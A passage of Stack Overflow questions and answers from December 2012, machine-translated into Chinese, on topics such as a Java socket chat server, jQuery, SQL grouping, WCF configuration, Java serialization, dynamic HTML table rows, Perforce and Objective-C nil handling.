    if (file ends with .class) {
       materialize class using Class.forName
     } 
  }
} 
```

使用该`Class`实例，您可以检查它是否正在实现您的`Plugin`接口。

还要记住，如果您需要向插件添加任何上下文，您可以在每个接收上下文对象的插件中创建一个构造函数，而不是使用默认构造函数。在这种情况下，`newInstance()`您必须通过反射获取带有所需参数的构造函数，而不是使用。

# java - 向多个客户发布问题

> ID：13870322
> 
> 赞同：0
> 
> 时间：2012-12-13T23:23:49.393
> 
> 标签：java, sockets, hashmap

嘿伙计们，我最近刚刚掌握了套接字，但遇到了向多个客户发布的问题。我已经让它多线程来处理这个问题，并试图将服务器需要发送到的所有客户端数据保存在哈希图中，但是在循环和添加到哈希图中时。它似乎只添加一个人。这是代码..

```
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.Map;

public class HostMain extends Thread {

/**
 * The set of all names of clients in the chat room.  Maintained
 * so that we can check that new clients are not registering name
 * already in use.
 */
private static HashMap<String, ConnectedUsers> users = new HashMap<String, ConnectedUsers>();

public HostMain() throws IOException
{

}

public void run()
{
    try
    {
    System.err.println("SERVER:The chat server is running.");
    ServerSocket listener = new ServerSocket(PORT);
    System.err.println("SERVER:socket created");
    Constants.getInstance().getStatusLabel().setText("Server is running. Join when ready");
    try {
        while (true) {

            System.err.println("SERVER:New handler being created");
            new Handler(listener.accept()).start();

        }
    } finally {
        listener.close();
    }
    }
    catch(Exception e)
    {
        Constants.getInstance().getStatusLabel().setText("SERVER:A HOST IS ALREADY RUNNING ON THIS PORT!");
        System.err.println("SERVER:A HOST IS ALREADY RUNNING ON THIS PORT!");
    }
}
/**
 * The port that the server listens on.
 */
private static final int PORT = 1337;

/**
 * The appplication main method, which just listens on a port and
 * spawns handler threads.
 */

/**
 * A handler thread class.  Handlers are spawned from the listening
 * loop and are responsible for a dealing with a single client
 * and broadcasting its messages.
 */
private static class Handler extends Thread {
    private String name;
    private Socket socket;
    private BufferedReader in;
    private PrintWriter out;
    private ObjectInputStream oin;
    private ObjectOutputStream oout;
    /**
     * Constructs a handler thread, squirreling away the socket.
     * All the interesting work is done in the run method.
     */
    public Handler(Socket socket) {
        this.socket = socket;
    }

    /**
     * Services this thread's client by repeatedly requesting a
     * screen name until a unique one has been submitted, then
     * acknowledges the name and registers the output stream for
     * the client in a global set, then repeatedly gets inputs and
     * broadcasts them.
     */
    public void run() {
        try {

            // Create object streams for the socket.
            in = new BufferedReader(new InputStreamReader(
                socket.getInputStream()));
            out = new PrintWriter(socket.getOutputStream(), true);
            oin = new ObjectInputStream(socket.getInputStream());
            oout = new ObjectOutputStream(socket.getOutputStream());

            //add socket to a list
            users.put(name,new ConnectedUsers(name,oout));
            System.err.println(users.size());
            // Accept messages from this client and broadcast them.
            // Ignore other clients that cannot be broadcasted to.
            while (true) {

                Object obj = oin.readObject();
                Messages message = (Messages)obj;
                if(obj.getClass().equals(Messages.class))
                {
                    for(Map.Entry<String, ConnectedUsers> entry:users.entrySet())
                    {

                            ConnectedUsers user = entry.getValue(); 
                            user.objectWriter.writeObject(message);
                    }

                }            

            }
        } catch (IOException | ClassNotFoundException e) {
            System.out.println(e);
        } finally {
            // This client is going down!  Remove its name and its print
            // writer from the sets, and close its socket.
            if (name != null) {
                users.remove(name);
            }
            try {
                socket.close();
            } catch (IOException e) {
            }
        }
    }
}
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-13T23:32:01.770

`name`似乎总是为空，因此您继续使用相同的键（空），这可以解释为什么您的地图中只有一个用户。

另请注意，HashMap 不是线程安全的 - 除非您在从线程访问映射时添加某种形式的同步，否则它可能会产生令人惊讶的结果。

您可以改为使用线程安全映射，例如 ConcurrentHashMap。

# jquery - 为什么这个 jQuery 代码在 Firefox 中不能正常工作？

> ID：13870325
> 
> 赞同：-1
> 
> 时间：2012-12-13T23:24:04.523
> 
> 标签：jquery, firefox

在 Chrome 中，这段代码运行良好。但在 Firefox - 它没有。我被困住了...

```
$(document).ready(function(){

var score = 0;

$('.left').hide();
$('.right').hide();

$("#score h2").html("What emotion is being shown?").hide().fadeIn('slow');

$('.happy').click(function(){

    if($(this).hasClass('happy') && $(".thegame").find("img:eq(1)").hasClass("happy")){
    $('.left').show();
    $('.right').show();
    score++;
    $(numbz).html(score);
            setTimeout(trolli,3000);
    function trolli(){

         sadgame = $('.thegame').html('<div class="pic"><img class="left" src="img/sadness02.jpg"/ ></div><div class="pic"><img class="sadness" src="img/sad03.jpg"/ ></div><div class="pic"><img class="right" src="img/sadness01.jpg"/ ></div>');
        $('.left').hide();
        $('.right').hide();
       $("h2").removeAttr('id', 'canswer').html("What emotion is being shown?").hide().fadeIn('slow')};

        $("h2").attr('id', 'canswer').html("You are correct! Happiness looks the same on everybody!").hide().fadeIn('slow');
    } else if(!$(".thegame").find("img:eq(1)").hasClass("happy")){
        $("#score h2").attr('id', 'wanser').html("You are not correct! Try again.").hide().fadeIn('slow');
        score--;
        $(numbz).html(score);
    };

}); 
```

我的 HTML：

```
<!DOCTYPE html>
<head>
    <link rel="stylesheet" href="stylesheet.css">
    <title>
        facetest.com
    </title>
</head>

<body>
    <div id="container">
        <div id="answers">
        <div class="sadness">
            <p class="feelings">SADNESS</p>
        </div>
        <div class="anger">
            <p class="feelings">ANGER</p>
        </div>
        <div class="surprise">
            <p class="feelings">SURPRISE</p>
        </div>
        <div class="fear">
            <p class="feelings">FEAR</p>
        </div>
        <div class="disgust">
            <p class="feelings">DISGUST</p>
        </div>
        <div class="contempt">
            <p class="feelings">CONTEMPT</p>
        </div>
        <div class="happy">
            <p class="feelings">HAPPINESS</p>
        </div>

        </div>

        <div class="thegame">
            <div class="pic">
                <img class="left" src="img/happy-man.jpg"/ >
            </div>
            <div class="pic">
                <img class="happy" src="img/happy-woman.jpg"/ >
            </div>
            <div class="pic">
                <img class="right" src="img/happy-celeb.jpg"/ >
            </div>
        </div>

        <div id="score">
            <h2 class="emoz">What emotion is being shown?</h2>
            <h3 class="playmeist">Score: <div id="numbz">0</div> pts.</h3>
            </div>
    </div>
</body>
</html> 
```

**同样，这段代码在 Chrome 中运行良好。但不是在 Firefox 中。这是为什么？** 每次点击幸福，它总是给我1分。但仅在 Firefox 中。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-13T23:41:12.817

这段代码实际上有很多问题。它在这里工作：

[http://jsfiddle.net/8vdmb/4/](http://jsfiddle.net/8vdmb/4/)

这里最大的问题是你缺少一个}。注意有一个函数 trolli(){ 然后下一个 } 就在 else if 之前，这意味着你从未结束你的函数。我不确定你想在哪里结束它，但我猜得很好。然后你也没有关闭 document.ready(function(){....你需要学习权力并列出你的代码，这样你就可以看到哪些括号没有关闭。这也是一个很好的想法这个很快也很好。另一个错误是settimeout试图调用一个尚未定义的函数，所以我把它移到了定义的地方。

这是代码：

```
$(document).ready(function(){

    var score = 0;

    $('.left').hide();
    $('.right').hide();

    $("#score h2").html("What emotion is being shown?").hide().fadeIn('slow');

    $('.happy').click(function(){

        if($(this).hasClass('happy') && $(".thegame").find("img:eq(1)").hasClass("happy")){
            $('.left').show();
            $('.right').show();
            score++;
            $(numbz).html(score);

            function trolli()
            {
                 sadgame = $('.thegame').html('<div class="pic"><img class="left" src="img/sadness02.jpg"/ ></div><div class="pic"><img class="sadness" src="img/sad03.jpg"/ ></div><div class="pic"><img class="right" src="img/sadness01.jpg"/ ></div>');
                $('.left').hide();
                $('.right').hide();
            }
            setTimeout(trolli,3000);
            $("h2").removeAttr('id', 'canswer').html("What emotion is being shown?").hide().fadeIn('slow');

            $("h2").attr('id', 'canswer').html("You are correct! Happiness looks the same on everybody!").hide().fadeIn('slow');
        }
        else if(!$(".thegame").find("img:eq(1)").hasClass("happy")){
         $("#score h2").attr('id', 'wanser').html("You are not correct! Try again.").hide().fadeIn('slow');
          score--;
          $(numbz).html(score);
        };

    });
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-13T23:42:33.450

你有的每一个地方，都`$(numbz)`改成`$('#numbz')`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-13T23:30:13.407

如果您在 Firefox 中启动 firebug，您可以看到问题。它没有找到您的 trolli 功能。

尝试将该函数和 score 变量移到 document.ready 调用的范围之外。

# kendo-ui - Kendo UI 将行添加到分组

> ID：13870326
> 
> 赞同：0
> 
> 时间：2012-12-13T23:24:05.960
> 
> 标签：kendo-ui

是否可以向网格分组添加新行？我有一个需要执行此操作的自定义按钮？

我在这里检查了文档：http: [//docs.kendoui.c​​om/api/web/grid#addrow](http://docs.kendoui.com/api/web/grid#addrow)，但我不确定如何在那里设置参数；比方说； `grid.addRow(TASK_ID=1)`， 或类似的东西。这怎么可能？

另外，你如何在模型模式中定义一个数组？

另一个中的 Json 数组对象，如下所示：

```
{
   feature_ID: 1,
   TASKS:{
        TASK_ID:
        TASK_NAME
   }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T22:39:43.503

```
grid.one("edit", function (e) {
    e.model.set("ID", 20);
});
grid.addRow(); 
```

# c++ - 创建一个可变大小的静态数组？

> ID：13870327
> 
> 赞同：0
> 
> 时间：2012-12-13T23:24:16.863
> 
> 标签：c++, arrays, stack, constants

我想创建一个不在堆上而是在堆栈上的数组。我的数组的大小将基于文件中的行数。

我发现了这个 SO 帖子：

[为什么可变长度数组不是 C++ 标准的一部分？](https://stackoverflow.com/questions/1887097/variable-length-arrays-in-c)

是否仍然没有办法在堆栈上创建一个数组，其中大小由其他东西决定，除了一个 const 吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T23:26:36.367

不，除非在编译时知道它的大小，否则您不能在堆栈上创建数组。不仅是`const`，而且是编译时常量。

# sql - SQL 查询 - IF X 在主复合键中的两个字符串之间共享？

> ID：13870329
> 
> 赞同：0
> 
> 时间：2012-12-13T23:24:26.573
> 
> 标签：sql, crystal-reports, unique, composite-primary-key

不知道如何解释，因为我只有基本的 SQL 知识。当在复合主键中多次引用唯一字符串时，我需要一些逻辑帮助来向用户发出信号。

我使用的表包含一个复合主键，它将唯一的“ItemCode”与重复的“WarehouseCode”联系起来。“QuantityOnHand”列列出了我们在每个仓库中拥有的物品数量：

```
 _____PK_______
    |              |
ItemCode  |  WarehouseCode  |  QuantityOnHand
---------------------------------------------
   001             A                 100
   001             B                 500
   002             A                 600
   003             B                 250 
```

等等

当 ItemCode 001 在两个单独的仓库中时，我如何“发出信号”（创建布尔值？）？

最终结果是一个水晶报告，当一件物品的总数量在两个仓库之间分配时，它会以某种方式提醒用户。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-13T23:44:44.237

利用 GROUP BY 和 HAVING。例如，此查询将返回 ItemCodes 列表以及它们在多少仓库中的计数，其中该计数大于 1。

```
SELECT ItemCode, COUNT(*)
FROM table
GROUP BY ItemCode
HAVING COUNT(*) > 1 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-14T10:01:19.777

在水晶中，您可能希望在 ItemCode 上创建一个组，然后您可以评估：`DistinctCount({table.WarehouseCode})`但我建议您使用 SQL`group by ItemCode having count(distinct WarehouseCode) > 1`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-13T23:51:46.580

在 Crystal 中比在纯 SQL 中更容易做到

使用水晶功能：

```
If {table.ItemCode} = Previous({table.ItemCode})
    Then //we have a duplicate ItemCode, do something to flag it 
```

以上假设细节具有这些值并且它们没有被分组。虽然，即使他们被分组这样的事情也应该这样做

```
If {table.ItemCode} = Previous({table.ItemCode})
    and {table.WarehouseCode} <> Previous({table.WarehouseCode})
    Then //we have a duplicate ItemCode 
```

# c++ - 编译时出现 C++ 错误

> ID：13870332
> 
> 赞同：0
> 
> 时间：2012-12-13T23:24:30.893
> 
> 标签：c++, c++builder

我有这个方法，错误是：

> `\Supp.cpp:35:6: attention : variable 'temp' set but not used [-Wunused-but-set-variable]`

我不明白为什么。

```
void parcourir_index(int * vec){
  int i;
  int temp;
  for (i = 0; i < n; i++) {
    temp = vec[i];
  }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T23:30:22.823

因为 temp 是一个局部变量，并且在 'temp=vec[i]' 之后没有对其的引用，所以编译器会将 temp 视为冗余，并通过一个名为**Dead Code Elimination**的过程将其消除。

# c# - WCF 服务配置信息是否进入客户端？

> ID：13870335
> 
> 赞同：0
> 
> 时间：2012-12-13T23:24:36.850
> 
> 标签：c#, visual-studio-2010, wcf, web-config

我对 WCF 服务的引用有疑问。我有两个应用程序：

控制台应用
--Library
----WCF 服务

控制台应用程序和库在同一个解决方案中。由于库中的 WCF 服务，它的 app.config 包含 WCF 服务的信息。

控制台应用程序配置与 WCF 服务无关。控制台应用程序通过库间接调用 WCF 服务。我猜这就是控制台应用程序在其配置中没有 WCF 信息的原因（因为它对 Web 服务一无所知）。控制台应用程序调用库中的静态方法，该方法处理 WCF 调用。

我在上述调用中收到此错误：

在 ServiceModel 客户端配置部分中找不到引用合同“MyServiceReference.IMyService”的默认端点元素。这可能是因为没有为您的应用程序找到配置文件，或者因为在客户端元素中找不到与此合同匹配的端点元素

主机（控制台应用程序）是否需要库中的 WCF 服务相关信息？如果是这样，为什么VS2010没有添加它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T04:40:38.523

您创建的库（“--Library”，在您的层次结构中）可能向您的 WCF 服务添加了服务引用。（“在图书馆里”没有意义，所以我假设这就是你的意思）。这意味着有关 WCF 服务的大量信息已添加到*库*的 app.config 中。该信息需要在引用库的任何 exe 的 app.config 中，以便库正确访问它引用的 WCF 服务。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-14T15:20:28.517

我建议运行 SVCUtil.exe。您可以像这样针对正在运行的服务运行它：

```
svcutil.exe http://localhost:Port/YourSvcClass/YourSvcMethod /language:c# 
```

这将做的是在 c# 中构建一个客户端 c#（或 vb）存根类，加上一个 .Config 文件，其中包含您需要连接的确切客户端配置文件......所有好东西。您还可以像这样对您的 WCF dll 运行 svcutil：

```
svcutil.exe c:\yourfolder\YourService.dll /language:c# 
```

无论您是否使用存根类，.config 文件都将有助于设置客户端。

祝你好运

# java - 无法添加到已反序列化的自定义构建的链表

> ID：13870336
> 
> 赞同：1
> 
> 时间：2012-12-13T23:24:46.023
> 
> 标签：java, serialization, io, singly-linked-list

我用包含数据变量和下一个节点变量的节点对象制作了一个单链表。客户对象存储在数据变量中，客户文件有一个姓氏变量和一个名字变量，如下所示：

```
public customer
{
String Surname;
String Forename;
get and set methods for each;
} 
```

链接列表和节点类将按姓氏 (AZ) 升序排序，因此 George Clooney 排在 Jay Gatsby 之前。用于在链表中递归插入项目的方法很好，在尝试使用 and 保存文件或使用 and 加载文件之前，我已经运行了`ObjectOutputStream`许多`FileOutputStream`测试。`ObjectInputStream``FileInputStream`

作为我所做的所有研究的结果，我得出的结论是，最好使用*自定义*链表（不是标准 Java 列表）上的可序列化接口将整个链表保存为对象，以将其序列化并保存到文件。

现在，这是我的问题：我添加了 1 个带有随机姓氏的 Node 对象，它工作正常：每次添加项目时，列表都会从文件中反序列化并加载到新`SinglyLinkedList`对象中。`ObjectOutputStream`新节点被添加并放置在列表中的正确位置，然后这个新列表通过和传递回文件`FileOutputStream`。

我添加了一项，这很好；但是，如果我添加另一个，它*说它*很好（没有错误 - 我有所有适当的`try`和`catch`声明），但它实际上并没有更新列表。print 方法强化了这一点，因为它也以相同的方式访问列表并且只打印第一项（即使添加了更多项）。当我询问列表的长度时，它只是给了我第一项（例如返回 1）。

如果我关闭它并重新运行它，我将再次收到相同的 1 个节点，仅此而已。然后，如果我要添加另一个，它就不会再工作了。

以下是一些有用的信息：

*   客户文件、节点和单链表类具有必要的可序列化导入并实现可序列化标头
*   有 4 个单独的类，客户文件 - 包含数据，节点 - 包含客户文件和下一个节点，单链表 - 包含编辑列表的所有方法和主类，其中包含所有扫描仪和可序列化流对象（例如 ObjectOutputStream）并从键盘获取命令和数据（例如“ADD”、“PRINT”）
*   有单独的方法可以保存和加载到文件中，这些方法用于减少屏幕上的代码覆盖率——这可能是问题所在——我是这个新手，但这里是代码。

在 MAIN METHOD 中添加节点的代码 - 不是递归例程

```
CustomerFile custDat = new CustomerFile(fName,sName); 

            Node custNode = new Node(custDat, null);
            SinglyLinkedList a = loadListFromFile();
            if (a == null)
            {
                System.out.println("Creating new list");
                SinglyLinkedList newList = new SinglyLinkedList();
                newList.addRecord(custNode, null);
                a = newList;
            }
            else
            {
                a.addRecord(a.getHead(), custNode);
            }
            saveListToFile(a);
            System.out.println("File added successfully"); 
```

并且`loadListFromFile`方法（保存列表方法类似，但有输出）有一个集合`fileName`：

```
private static SinglyLinkedList loadListFromFile()

{
    SinglyLinkedList lst = null;
    try
    {
        ObjectInputStream is = new ObjectInputStream(new FileInputStream(fileName));
        lst = (SinglyLinkedList) is.readObject();
        is.close();
    }
    catch(FileNotFoundException e)
    {
        e.printStackTrace();
    }
    catch(IOException e)
    {
        e.printStackTrace();
    }
    catch(ClassNotFoundException e)
    {
        e.printStackTrace();
    }
    return lst;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T23:28:14.140

幸运的是，我已经解决了这个问题！感谢您的帮助，但问题归结为我的逻辑失败。我运行一个循环，获取值并将它们添加到节点，这些节点被添加到一个列表中，该列表在列表中被声明为 NEW - 即列表无法到达 saveListToFile 方法，因此不会添加到正在保存的列表中文件

# c# - 基于 Web 的应用程序是否有单层架构？

> ID：13870338
> 
> 赞同：0
> 
> 时间：2012-12-13T23:24:54.150
> 
> 标签：c#, architecture

谁能给出基于 Web 的单层架构的任何示例？我知道单层意味着所有层都在同一台机器上运行......从数据库返回数字的肥皂服务是一个例子还是两层？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-13T23:30:56.690

> 从数据库返回数字的肥皂服务是一个例子还是两层？

使用数据库后端是一个两层架构。另一个例子是老式的 ASP 风格的开发，其中 .asp 文件直接访问数据库。

> 谁能给出基于 Web 的单层架构的任何示例？

单层可能是直接打开 csv 文件并从中读取的网页。另一个示例是根本不需要数据的 Web 服务，例如时间服务。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-13T23:35:39.987

实际上**没有**单层 Web 应用程序。是的，我坚持:)

因为 Web 浏览器和客户端机器实际上是一个层。

但为了让事情变得简单，社区假设放弃这个轮胎，因为它不在开发者手中。

无论如何，如果您认为任何不处理数据库的网页**或以更好的方式（如 csharptest.net）说：**

> 单层可能是直接打开 csv 文件并从中读取的网页。另一个示例是根本不需要数据的 Web 服务，例如时间服务

您可以将其视为单层

# php - 用户能否通过我网站上的 HTML 输入验证 Google API？

> ID：13870346
> 
> 赞同：0
> 
> 时间：2012-12-13T23:25:44.217
> 
> 标签：php, google-drive-api

我只知道如何使用授权 URL 让用户将他们的帐户连接到我的网站。有没有办法通过 HTML 表单进行授权？例如，用户在我的网站上输入他们的 Google 电子邮件和密码，它会验证该帐户，而无需他们在 Google 上登录和退出帐户，然后访问身份验证 URL。

这样做的原因是将多个 Google 帐户连接到我网站上的一个帐户。要求他们为他们想要附加的每个帐户登录和退出谷歌将是一个巨大的痛苦。只需在我的网站上的表单中输入信息并对其进行身份验证，用户体验会好得多。这在 PHP 或任何语言中是否可行？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-13T23:56:59.290

这是个坏主意，您真的要对用户的 Google 密码负责吗？你认为用户会相信你的信息吗？我知道我不会，而且我非常怀疑您的视线是实施了该行为的网络钓鱼计划。

改用[OAuth 2.0](https://developers.google.com/accounts/docs/OAuth2)或[OpenID](https://developers.google.com/accounts/docs/OpenID)，省去处理用户密码的麻烦。

# javascript - Javascript 添加表格行

> ID：13870348
> 
> 赞同：1
> 
> 时间：2012-12-13T23:25:47.710
> 
> 标签：javascript, html-table

我不确定如何在我想要的地方添加一行。

```
<script language="javascript">
var i = 1;
function changeIt()
{
    i++;
    my_div.innerHTML = my_div.innerHTML +"<tr><td valign='middle'><strong>URL "+ i+":</strong></td><td><input name='url'+ i type='text' size='40' /></td></tr>"
}
</script>

<form method="post" action="<?php echo $_SERVER["REQUEST_URI"]; ?>">
    <table width="300px">
        <tr>
            <td valign="middle"><strong>Name:</strong></td>
            <td><input name="name" type="text" size="40" /></td>
        </tr>
        <tr>
            <td valign="middle"><strong>Password:</strong></td>
            <td><input name="password" type="text" size="40" /></td>
        </tr>
        <tr>
            <td valign="middle"><strong>URL:</strong></td>
            <td><input name="url" type="text" size="40" /><a href="" onClick="changeIt();return false;">+</a></td>
        </tr>
        <tr id="my_div"></tr>
        <tr>
            <td valign="middle"><strong>ETC:</strong></td>
            <td><input name="etc" type="text" size="40" /></td>
        </tr> 
```

以下是我希望行出现的位置：

```
<tr id="my_div"></tr> 
```

目前，这会在一行中产生新行。我不想要那个。我只想要一个新行而不是一行。

当我单击 + 我希望它产生：

```
 <tr>
        <td valign="middle"><strong>URL 2:</strong></td>
         <td><input name="url2" type="text" size="40" /></td>
    </tr> 
```

我不希望在：

```
<tr id="my_div"></tr> 
```

我只是在那里，因为我不知道该怎么做。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-14T01:59:55.637

不要使用innerHTML 来修改表格，在大多数版本的IE 中都会抛出错误。使用 DOM 方法。

当您不需要链接或锚点时，不要使用 A 元素，请使用按钮或样式跨度之类的元素。

您不能将 TR 元素添加为 DIV 元素的子元素，这是无效的。您必须将其添加为表格部分元素（thead、tbody 或 tfoot）的子元素。在某些情况下，您可以向表格元素添加行，但有些浏览器也不喜欢这样做。

因此，要创建新行，请使用：

```
var tr = document.createElement('tr');
var td = tr.appendChild(document.createElement('td'));

// Much better to add a class and do this stuff with CSS
td.style.valign = 'middle';
var span = document.createElement('span');
span.style.fontWeight = 'bold';
span.appendChild(docment.createTextNode('URL ' + i);

td = tr.appendChild(document.createElement('td'));
var input = td.appendChild(document.createElement('input'));
input.name = 'url' + i;
input.type = 'text';
input.size = '40' 
```

现在将 TR 附加到某处的表格部分。

```
document.getElementById('myTable').tBodies[0].appendChild(tr); 
```

整个事情看起来像：

```
<script>
var i = 1;

function changeIt() {
    var tr = document.createElement('tr');
    var td = tr.appendChild(document.createElement('td'));
    td.style.valign = 'middle';

    var span = td.appendChild(document.createElement('span'));
    span.style.fontWeight = 'bold';
    span.appendChild(document.createTextNode('URL ' + i));

    td = tr.appendChild(document.createElement('td'));
    var input = td.appendChild(document.createElement('input'));
    input.name = 'url' + ++i;
    input.type = 'text';
    input.size = '40'

    document.getElementById('myTable').tBodies[0].appendChild(tr);

}
</script>

<form>
    <table width="300px">
        <tr>
            <td valign="middle"><strong>Name:</strong></td>
            <td><input name="name" type="text" size="40" /></td>
        </tr>
        <tr>
            <td valign="middle"><strong>Password:</strong></td>
            <td><input name="password" type="text" size="40" /></td>
        </tr>
        <tr>
            <td valign="middle"><strong>URL:</strong></td>
            <td><input name="url" type="text" size="40">
                <input type="button" onclick="changeIt();" value="+"></td>
        </tr>
        <tr id="my_div"></tr>
        <tr>
            <td valign="middle"><strong>ETC:</strong></td>
            <td><input name="etc" type="text" size="40" /></td>
        </tr>
    </table>
</form>

<table id="myTable">
  <tbody></tbody>
</table> 
```

您可以构建要添加到底部表格中的行并将其隐藏，然后克隆它并修改需要它的位。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-13T23:28:22.667

好的，所以要在 URL1 之后向表中添加另一行，给前面的行 URL1 一个`id`属性，然后附加到 innerHTML。我将 JS 设置为检索当前的 URL 编号，从 1 开始，这样每次单击按钮时，它都会附加一个 URL 行。

我还更新了您的`name`属性以包含`''`刻度

```
<script language="javascript">
var i = 1;
function changeIt(){
    var myCurrentTable = document.getElementById("myTable");
    var txt = myCurrentTable.innerHTML;
    i++;
    txt = txt.replace('<tr id="etc_row">', '</tr><tr id="url_row_' + i + '"><td valign="middle"><strong>URL '+ i+':</strong></td><td><input name="url' + i + '" type="text" size="40" /></td><tr id="etc_row">');
    myCurrentTable.innerHTML = txt;
}
</script>

<form method="post" action="<?php echo $_SERVER["REQUEST_URI"]; ?>">
<table id="myTable" width="300px">
    <tr id="name_row">
        <td valign="middle"><strong>Name:</strong></td>
        <td><input name="name" type="text" size="40" /></td>
    </tr>
    <tr id="pw_row">
        <td valign="middle"><strong>Password:</strong></td>
        <td><input name="password" type="text" size="40" /></td>
    </tr>
    <tr id="url_row_1" >
        <td valign="middle"><strong>URL:</strong></td>
        <td><input name="url" type="text" size="40" /><a href="#" onClick="javascript:changeIt();">+</a></td>
    </tr>
    <tr id="etc_row">
        <td valign="middle"><strong>ETC:</strong></td>
        <td><input name="etc" type="text" size="40" /></td>
    </tr>
</table> 
```

# perforce - 在 Perforce 集成期间忽略源文件的正确方法

> ID：13870354
> 
> 赞同：4
> 
> 时间：2012-12-13T23:26:18.767
> 
> 标签：perforce, perforce-integrate

在我的主分支中，有一个包含 10 个文件的更改列表，我正在尝试将它们集成到开发分支中。更改列表中的所有未完成文件都应该被忽略，而不是分支到目标中。

执行集成的步骤是什么，以便 Perforce 不会在目标分支中创建文件，并忽略所有未来集成的更改列表文件？

我最初与 进行了集成`-Dt`，然后还原了我不想在目标分支中创建的 10 个文件。在此之后，Perforce 继续尝试将这些文件重新集成到目标中。

也许这是问题的一部分或无关紧要，但源文件不是文本编辑，而是对文件类型字段的更新

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-14T14:40:23.050

集成文件，然后在解析时“接受你的”。这告诉服务器您要明确忽略来自另一个分支的更改，并且服务器随后不会在未来的集成中包含该更改。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-11-07T19:07:10.917

这对我有用：

```
p4 integrate -Rb -Rd -b <branch> 
```

然后在 P4V 中，解决 --> 接受目标。

有关-Rb 和 -Rd 选项的信息，请参见[此处。](https://www.perforce.com/perforce/r16.1/manuals/cmdref/p4_integrate.html)

# iphone - 如果您在运行时将 nil 传递给不应接受的参数会发生什么？

> ID：13870356
> 
> 赞同：1
> 
> 时间：2012-12-13T23:26:28.813
> 
> 标签：iphone, objective-c, ios, location, cllocationmanager

假设我有一个采用 CLLocationCoordinate2D 的方法。我不能在代码中直接将 nil 传递给它；编译器抱怨。但是，以下编译。那么在运行时会发生什么？

```
CLLocation* loc = nil;
[self passMeCoordinates:loc.coordinate]; 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-13T23:35:45.260

这是个有趣的问题。我假设您之前的代码是：

```
[self passMeCoordinates:nil]; 
```

编译器对此抱怨，因为 CLLocationCoordinate2D 不是对象。这是一个 C 风格的结构。因此，您不能在需要结构的地方传递对象/指针（nil）。（它们的大小不同等）

如果我将您的代码稍微解释为：

```
CLLocation* loc = nil;
CLLocationCoordinate2D coord = loc.coordinate;
[self passMeCoordinates:coord]; 
```

问题归结为“有什么价值`coord`”。您可能知道，Objective-C 中的规则是，如果您向 nil 发送消息（就像我们在这里所做的那样 - loc.coordinate 等价于 [loc coordinate]），那么您将返回 0。但是如果我们'重新期待一个结构？正如我刚才提到的，它与整数的大小不同。好吧，事实证明结果取决于您使用的编译器：

LLVM 3.0+（Xcode 4.2+）：返回全零，因此它相当于（0,0）的坐标：[我可以依靠 nil UIView 返回 CGRectZero 的帧吗？](https://stackoverflow.com/questions/10051785/can-i-rely-on-nil-uiview-returning-cgrectzero-for-its-frame)

LLVM 早期/GCC：一个结构可以填充垃圾/未定义的内容，所以它可以是任何东西。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-13T23:31:56.553

Loc.coordinate 是一种结构，因此您不能为此传递 nil 。
并且返回 C 结构的方法在 nil 上调用是不安全的。因此，您的警告不是关于将 nil 作为参数传递。

至于你关于 nil 作为论点的问题。好吧，这取决于方法，有些可以优雅地处理 nil ，有些则不会。如果您可以或不能将 nil 作为参数传递，请参阅通常所说的那些方法的文档。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-13T23:35:19.560

正如其他人指出的那样，您正在处理对象的`struct`属性`location`，因此`nil`会有问题。您应该只`nil`与对象一起使用。

但更一般地说，你永远不应该假设任何方法都会接受`nil`作为参数。这一切都因方法而异。对于内置类，它通常会在文档中指定`nil`参数何时可接受。如果它没有说这`nil`是允许的，那么明智的做法是假设它不是。

您自己的代码是否接受`nil`参数完全取决于您对该参数所做的操作，以及您是否正在做任何需要它不接受的事情，`nil`您的代码是否正在检查非`nil`值并进行适当处理等。

作为一个完全随机的例子，如果你有一个方法：

```
NSMutableArray *array = [NSMutableArray array];
[array addObject:text]; 
```

如果is ，这将产生一个`NSInvalidArgumentException`异常。`text``nil`

归根结底，这一切都因方法而异。请参阅相关方法的文档以查看是否`nil`允许。

“除非文档说明可以，否则不要使用`nil`”规则的一个一般例外是，在向对象发送消息时`nil`（即调用对象上的方法`nil`）。这是允许的（但显然什么都不做）。正如文档所说：

> 在 Objective-C 中，您通常可以发送消息`nil`而不会产生不良影响。只要将返回的内容键入为对象，就可以保证发送到 nil 的消息的返回值有效。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-13T23:32:31.550

在运行时 nil 将被传递给您的方法。编译器不做运行时检查，它只做编译时类型检查。

# jquery - 如何通过多个选择框选择让 div 向下滑动或向上滑动

> ID：13870357
> 
> 赞同：1
> 
> 时间：2012-12-13T23:26:28.173
> 
> 标签：jquery, forms, html, slidedown

所以我想要的是一个代码，在选择各种选择框的值时显示一个 div。

**这是我的 html/css 代码：**

```
<body>
Selecção de produtos <br />
<form name="encomendaflyers">
<select name="flp">
    <option value="sf">Só Frente</option>
